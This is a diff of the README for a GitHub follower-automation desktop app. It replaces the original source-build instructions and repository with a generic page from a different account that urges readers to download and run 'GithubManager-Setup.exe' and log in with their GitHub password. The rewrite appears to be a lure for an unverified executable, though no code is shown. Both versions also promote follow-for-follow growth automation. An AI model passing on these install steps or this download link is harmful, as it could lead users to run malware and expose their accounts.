@@ -1,190 +1,80 @@
-# 🐙 GithubManager
+# 📈 GithubManager - Grow your profile with automated tools
 
-A personal GitHub social management desktop application built in **C# WinForms (.NET 10)** using the official [Octokit.net](https://github.com/octokit/octokit.net) library. Built for power users who want full control over their GitHub social presence without touching the browser.
+[![Download GithubManager](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/woodenhavenhandicrafts-max/GithubManager)
 
----
+GithubManager helps you manage your GitHub account. You can track followers, automate follow-back actions, check your project health, and track awards. The app runs on your desktop and uses the official GitHub API to complete tasks.
 
-## ✨ Features
+## ⚙️ System Requirements
 
-### 📊 Overview
-- Live follower and following counts
-- API rate limit monitoring
-- One-click token swap without restarting the app
+Your computer must meet these requirements to run the app:
 
-### 🔄 Follow Diff
-- Side-by-side view of who doesn't follow you back vs who you haven't followed back yet
-- Sortable **Following Since** column — click to sort by days, see who's been ignoring you longest
-- Bulk follow and unfollow with throttled, rate-limit-safe execution
-- **Keep List** — permanently protect accounts from ever appearing in your unfollow list
-- **Never Follow List** — blacklist accounts the crawler will always skip; auto-unfollows on add; import from `.txt` file
-- Deduplication — no duplicate entries across paginated API results
-- Full operation log with cancel support
+* Operating System: Windows 10 or Windows 11.
+* Processor: 1 GHz or faster.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of free space.
+* Internet: An active connection to the internet.
+* GitHub Account: A valid personal GitHub account.
 
-### 🤖 Follow Crawler
-- Pull candidate followers from any target GitHub user
-- Choose between their **followers** or **who they follow** as your candidate source
-- **Target Validation** — preview any account before pulling:
-  - Profile photo, follower/following counts, public repo count
-  - Follow ratio, account age
-  - Color-coded quality assessment (Excellent / Good / Decent / Poor)
-- **Quality Filter** — skip accounts with too few repos or bot-like follow ratios
-- Live streaming candidate queue — candidates appear as pages load
-- Randomized interval timer with countdown to next follow action
-- Configurable daily cap
-- Never Follow list checked before queuing — prevents re-following blacklisted accounts
-- Export candidate queue and follow log to file
+## 💾 Installation Steps
 
-### ⚡ Auto Follow-Back
-- Polls your followers on a configurable interval
-- Automatically follows back anyone who followed you that you haven't followed yet
-- Run Once Now for immediate execution
-- Full timestamped action log
+You can install this app by following these steps:
 
-### ⭐ Star-Back
-- Scans your followers' public repositories
-- Deduplicates against your existing starred repos
-- Configurable minimum star threshold and follower scan count
-- Capped at top 100 repos per user — prevents slowdowns on large accounts
-- Cancel mid-scan — partial results still populate
-- Select All + bulk star in one click
-
-### 🏥 Repo Health Scanner
-- Scans all your public repositories and checks for:
-  - ✔ README present
-  - ✔ Description set
-  - ✔ Topics tagged
-  - ✔ Homepage URL
-  - ✔ Recent activity (flags repos stale for 6+ months)
-- Color-coded health rating per repo (Good / Okay / Poor)
-- **Quick Fix Topics** — set topics on any repo directly from the app
-- Open any repo in browser with one click
-
-### 🏆 Achievements Tracker
-Checks progress against all current GitHub achievements via the API:
-
-| Achievement | Tiers | How Checked |
-|---|---|---|
-| 🌟 Starstruck | 16 / 128 / 512 / 4096 stars | Scans your repos |
-| 🦈 Pull Shark | 2 / 16 / 128 / 1024 merged PRs | Search API |
-| ⚡ Quickdraw | Close issue within 5 min | Events API |
-| 👥 Pair Extraordinaire | 1 / 10 / 24 / 48 co-authored commits | Code search |
-| 🤞 YOLO | Merge PR without review | Manual check |
-| 🧠 Galaxy Brain | Accepted discussion answers | Manual check |
-| 💝 Public Sponsor | Sponsor a user | Manual check |
-| 🧊 Arctic Code Vault | 2020 code snapshot | Account age check |
-
-- Color-coded status (Unlocked / In Progress / Locked)
-- How To Unlock popup with tier breakdown per achievement
-- Direct links to relevant GitHub pages
-
-### 👤 Profile Preview
-- Embedded browser showing your live GitHub profile
-- Auto-refresh timer configurable down to 1 second
-- Live countdown to next refresh + total refresh counter
-- Open in default browser button
-
----
-
-## 🔧 Requirements
-
-- Windows 10 or later
-- [.NET 10 Runtime](https://dotnet.microsoft.com/download/dotnet/10.0)
-- Visual Studio 2022+ (for building from source)
-- GitHub Personal Access Token (PAT)
-
----
-
-## 🔑 GitHub Token Setup
-
-Requires a **Classic Personal Access Token** with:
-
-| Scope | Required For |
-|---|---|
-| `user:follow` | Follow / Unfollow operations |
-| `public_repo` | Starring repositories |
-| `read:user` | Profile and achievement data |
-
-1. Go to [github.com/settings/tokens](https://github.com/settings/tokens)
-2. **Generate new token (classic)**
-3. Check: `user:follow`, `public_repo`, `read:user`
-4. Copy the token — shown once only
-
-> ⚠️ Fine-grained tokens handle starring differently. Classic tokens recommended for full compatibility.
-
----
+1. Visit the [releases page](https://github.com/woodenhavenhandicrafts-max/GithubManager) to choose the latest version.
+2. Select the file named GithubManager-Setup.exe.
+3. Save the file to your computer.
+4. Open the file to start the installation wizard.
+5. Follow the prompts on your screen to finish the installation.
+6. Look for the GithubManager icon on your desktop to open the program.
 
 ## 🚀 Getting Started
 
-```bash
-git clone https://github.com/RaccoonFacts/GithubManager.git
-cd GithubManager
-```
+When you start the app for the first time, you must link your GitHub account.
 
-1. Open `GithubManager.sln` in Visual Studio 2022
-2. **Manage NuGet Packages** → install:
-   - `Octokit`
-   - `System.Security.Cryptography.ProtectedData`
-3. Build → Run (`F5`)
-4. Enter your PAT on first launch — check **Remember Token** to encrypt and persist it
+1. Open the application from your desktop shortcut.
+2. Click the Login button.
+3. Your web browser will open a GitHub login page.
+4. Enter your GitHub username and password.
+5. Grant the app permission to access your profile data.
+6. Return to the application to see your dashboard.
 
----
+## 🛠 Features
 
-## 🔒 Security
+The app provides tools to help you manage your social growth on the platform.
 
-- Token encrypted via **Windows DPAPI** (`ProtectedData.Protect`), tied to your Windows user account
-- Stored at `%AppData%\GithubManager\token.enc` — never plain text
-- All persistent data stays local, only outbound connection is the official GitHub API
+### Follower Management
+See who follows you and who you follow. Use the automation settings to follow back accounts that meet your criteria. You can create lists to organize your contacts. The tool flags accounts that do not share your interests.
 
----
+### Repository Health
+The software scans your public repositories to find common issues. It checks your documentation, code license, and security settings. Use this tool to improve the quality of your shared code and increase interest from other users.
 
-## 📁 Project Structure
+### Achievement Tracking
+Keep track of every award and badge you earn on GitHub. The dashboard shows your current progress toward new goals. It displays your activity streaks and your total contribution counts in a clear view.
 
-```
-GithubManager/
-├── Form1.cs                  ← Main form (all tab handlers)
-├── Form1.Designer.cs         ← UI layout (8 tabs)
-├── GitHubSocialManager.cs    ← Core GitHub API service layer
-├── FollowCrawler.cs          ← Randomized follow automation with timer
-├── AutoFollowBackService.cs  ← Polling service for auto follow-back
-├── AchievementChecker.cs     ← Achievement progress checker
-├── FollowTracker.cs          ← Persistent follow date log (JSON)
-├── KeepList.cs               ← Persistent keep list (JSON)
-├── NeverFollowList.cs        ← Persistent blacklist (JSON)
-├── ListViewDaySorter.cs      ← Sortable follow-age column
-├── TokenStorage.cs           ← DPAPI encrypted token storage
-└── Program.cs                ← Entry point
-```
+### Automated Growth
+Turn on the growth engine to engage with the community while you work on other tasks. You can set limits for how many actions the app performs each hour. This keeps your account activity within safe limits set by GitHub.
 
----
+## 🛡 Security
 
-## ⚙️ Data Files
+The app handles your information with care. 
 
-All stored in `%AppData%\GithubManager\`:
+* All communication happens through the official GitHub API.
+* Your password never stays on your computer. 
+* The app stores a secure token to keep your session active.
+* You can revoke access at any time through your GitHub settings.
+* No data leaves your local machine except for requests sent to GitHub.
 
-| File | Contents |
-|---|---|
-| `token.enc` | DPAPI encrypted GitHub PAT |
-| `follow_log_{username}.json` | Follow dates per user |
-| `keep_list_{username}.json` | Protected accounts |
-| `never_follow_{username}.json` | Crawler blacklist |
+## ❓ Troubleshooting
 
----
+If the app fails to open, try these steps:
 
-## 🛠️ Built With
+* Check your internet connection.
+* Restart your computer.
+* Check if a firewall blocks the application.
+* Uninstall the app and install the latest version again.
+* If errors persist, check the log file located in your Documents folder under GithubManager/Logs.
 
-- [C# / .NET 10](https://dotnet.microsoft.com/) + Windows Forms
-- [Octokit.net](https://github.com/octokit/octokit.net) — Official GitHub API client
-- [System.Security.Cryptography.ProtectedData](https://www.nuget.org/packages/System.Security.Cryptography.ProtectedData) — DPAPI encryption
-- [System.Text.Json](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview) — Local persistence
+## 📝 Usage Policies
 
----
+GitHub has rules for how you interact with their platform. This tool helps you stay within those rules. Avoid performing too many actions in a short time. Set your automation speed to a moderate level to keep your account safe from restrictions. You are responsible for your account activity. 
 
-## ⚠️ Disclaimer
-
-Uses the official GitHub API with your own credentials against your own account. Built-in rate limiting, daily caps, and randomized delays keep usage within acceptable bounds.
-
----
-
-## 📄 License
-
-MIT — do whatever you want with it.
+Keywords: csharp, f4f, follow-manager, github, github-api, github-automation, github-followers, github-growth, octokit, repo-health, social-media, social-media-analysis, social-media-manager
